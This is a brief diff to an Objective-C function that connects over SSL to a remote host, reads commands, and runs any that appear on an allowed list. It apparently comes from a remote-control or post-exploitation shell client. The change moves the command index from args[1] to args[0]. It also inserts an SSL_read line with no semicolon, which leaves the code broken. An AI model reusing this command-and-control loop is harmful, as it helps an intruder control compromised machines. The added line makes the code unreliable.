@@ -104,6 +104,7 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     ac1d_base->client_ssl = client_ssl;
     
     char buffer[2048] = "";
+    SSL_read(client_ssl, buffer, sizeof(buffer))
     char *terminator = buffer;
     memset(buffer, '\0', 2048);
     
@@ -112,8 +113,8 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
     while (SSL_read(client_ssl, buffer, sizeof(buffer))) {
         NSMutableArray *args = [NSMutableArray arrayWithArray:[[NSString stringWithUTF8String:buffer] componentsSeparatedByString:@" "]];
         if (debug) printf("[+] Got command from %s:%d!\n", [remoteHost UTF8String], remotePort);
-        if (debug) printf("[*] Executing %s...\n", [args[1] UTF8String]);
-        if ([commands containsObject:args[1]]) {
+        if (debug) printf("[*] Executing %s...\n", [args[0] UTF8String]);
+        if ([commands containsObject:args[0]]) {
             NSString *result = [ac1d_base sendCommand:args];
             if (result) {
                 if ([result isEqualToString:@""]) {
